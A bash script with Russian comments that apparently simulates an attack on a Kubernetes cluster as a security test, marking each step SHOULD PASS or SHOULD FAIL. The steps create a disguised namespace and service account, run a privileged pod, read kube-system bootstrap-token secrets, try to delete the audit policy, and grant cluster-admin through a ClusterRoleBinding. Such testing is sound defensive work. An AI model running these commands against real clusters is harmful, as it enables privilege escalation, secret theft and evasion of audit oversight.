#!/bin/bash

echo "---1.(SHOULD PASS) Создание нового ns secure-ops" # имя выбрано, чтобы мимикрировать под какой-то контур безопасности
kubectl create ns secure-ops

#echo "---2.(SHOULD PASS) Выбор ns secure-ops в качестве текущего, дальше команды без указания n будут secure-ops\n  "
#kubectl config set-context --current --namespace=secure-ops

echo "---2.(SHOULD PASS) Создание sa monitoring" # имя выбрано, чтобы мимикрировать под какой-то мониторинг
kubectl create -n secure-ops sa monitoring

echo "---3. (SHOULD PASS) Создание спящего пода внутри secure-ops для дальнейших атак"
kubectl run attacker-pod -n secure-ops  --image=alpine --command -- sleep 3600

echo "---4. (SHOULD FAIL) Проверка доступа к секретам внутри ns secure-ops"
kubectl auth can-i get secrets -n secure-ops --as=system:serviceaccount:secure-ops:monitoring

echo "---5. (SHOULD FAIL) Попытка доступа к секрету в kube-system через as=system:serviceaccount:secure-ops:monitoring"
# Ищем под админом имя секрета
# Не должно сработать, т.к. у sa monitoring НЕТ доступа к ns kube-system (при создании sa, кажется, только прова на базовый просмотр),
# к секретам стороннего namespace доступа точно нет
kubectl get secret -n kube-system $(kubectl get secrets -n kube-system | grep bootstrap-token | head -n1 | awk '{print $1}') --as=system:serviceaccount:secure-ops:monitoring

echo "---6. (SHOULD PASS) Создание спящего привилегированного пода (privileged: true) для дальнейших атак"
cat <<EOF | kubectl apply -f  -
apiVersion: v1
kind: Pod
metadata:
  namespace: secure-ops
  name: privileged-pod
spec:
  containers:
  - name: pwn
    image: alpine
    command: ["sleep", "3600"]
    securityContext:
      privileged: true
  restartPolicy: Never
EOF

echo "---7. (SHOULD FAIL) Попытка прочитать конфиги через exec на одном из coredns подов"
# попытка выполнить код (тут - прочитать файл) на coreDns поде, имя которого ищется через admin аккаунт
# (вероятно, предполагается, что у злоумышленника уже доступ admin права)
# сама команда exec не сработает, потому что на coreDns нет cat (что вероятно сделано специально во избежание подобных атак)
# типа - пример, как минимизация образа пода coredns (нет cat внутри) защитила от атаки
kubectl exec -n kube-system $(kubectl get pods -n kube-system | grep coredns | awk '{print $1}' | head -n1) -- cat /etc/resolv.conf

echo "---8. (SHOULD FAIL) Попытка выключить политики аудита"
kubectl delete -f /etc/kubernetes/audit-policy.yaml --as=admin

echo "---9. (SHOULD PASS) Попытка повысить привилегии для sa monitoring - установив cluster-admin ClusterRole"
cat <<EOF | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: escalate-binding
subjects:
- kind: ServiceAccount
  name: monitoring
  namespace: secure-ops
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
EOF

echo "---10. (SHOULD PASS !!! ALARM) Повторная попытка чтения секрета в ns kube-system --as=system:serviceaccount:secure-ops:monitoring"
kubectl get secret -n kube-system $(kubectl get secrets -n kube-system | grep bootstrap-token | head -n1 | awk '{print $1}') --as=system:serviceaccount:secure-ops:monitoring

echo "---11. (SHOULD PASS - !!!! проблема, если это существующий ns) Повторная проверка доступа к секретам внутри ns secure-ops "
kubectl auth can-i get secrets -n secure-ops --as=system:serviceaccount:secure-ops:monitoring

echo "----12. (SHOULD PASS) Возврат ns default - на всякий случай"
kubectl config set-context --current --namespace=default